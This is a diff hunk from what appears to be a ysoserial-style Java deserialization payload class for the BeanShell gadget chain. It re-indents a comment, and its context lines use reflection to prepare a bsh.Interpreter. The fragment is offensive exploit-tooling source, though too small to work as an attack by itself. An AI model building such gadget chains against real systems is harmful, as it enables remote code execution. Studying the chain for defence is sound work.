@@ -33,12 +33,12 @@ public class BeanShell extends PayloadRunner implements ObjectPayload<PriorityQu
         // Create Interpreter
         Object interpreter = loader("bsh.Interpreter",relyJar).newInstance();
         Class<?> nameSpace = loader("bsh.NameSpace",relyJar);
-		/*
-			bsh.Interpreter()
-				bsh.initRootSystemObject()
-					bsh.setu("bsh.cwd", System.getProperty("user.dir"))
-							bsh.cwd /Users/bearcat/Desktop/ysoserial
-		*/
+	/*
+		bsh.Interpreter()
+			bsh.initRootSystemObject()
+				bsh.setu("bsh.cwd", System.getProperty("user.dir"))
+					bsh.cwd /Users/bearcat/Desktop/ysoserial
+	*/
         Method setu = interpreter.getClass().getDeclaredMethod("setu",new Class[]{String.class,Object.class});
         setu.setAccessible(true);
         setu.invoke(interpreter,new Object[]{"bsh.cwd",null});
